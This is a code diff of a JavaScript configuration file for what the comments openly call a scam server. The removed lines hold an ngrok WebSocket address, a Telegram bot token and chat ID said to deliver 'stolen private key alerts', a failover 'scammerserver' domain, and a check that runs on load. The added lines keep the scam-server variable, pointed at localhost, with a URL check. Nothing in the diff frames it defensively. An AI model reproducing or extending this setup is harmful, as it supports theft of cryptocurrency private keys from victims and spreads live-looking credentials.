@@ -1,25 +1,7 @@
-// ✅ WebSocket scam server (update this if Ngrok/VPS URL changes)
-const SCAM_SERVER = "wss://b0ed-41-96-9-150.ngrok-free.app";  // Use the correct Ngrok/VPS WebSocket URL
+// ✅ Define SCAM_SERVER for WebSocket connection
+const SCAM_SERVER = "ws://localhost:5000";  // Change this to your WebSocket server URL
 
-// ✅ Telegram bot configuration (for stolen private key alerts)
-const TELEGRAM_BOT_TOKEN = "8001637745:AAHoM9PCHgiKlJp466D7g7mksDo5iAnb5jM";  
-const TELEGRAM_CHAT_ID = "8059448119";  
-
-// ✅ Failover server in case the primary WebSocket fails
-const FAILOVER_SERVER = "wss://backup-scammerserver.com";  
-
-// ✅ Function to validate WebSocket connection
-function validateScamServer() {
-    fetch(SCAM_SERVER.replace("wss://", "https://") + "/test")
-        .then(response => {
-            if (!response.ok) throw new Error("Scam server unreachable.");
-            console.log("✅ Scam server is active:", SCAM_SERVER);
-        })
-        .catch(error => {
-            console.error("❌ Scam server failed, switching to failover:", error);
-            window.SCAM_SERVER = FAILOVER_SERVER;  // Use backup server
-        });
+// ✅ Validate SCAM_SERVER
+if (!SCAM_SERVER.startsWith("ws://") && !SCAM_SERVER.startsWith("wss://")) {
+    console.error("❌ Invalid SCAM_SERVER URL. Please check config.js.");
 }
-
-// ✅ Run validation check on script load
-validateScamServer();
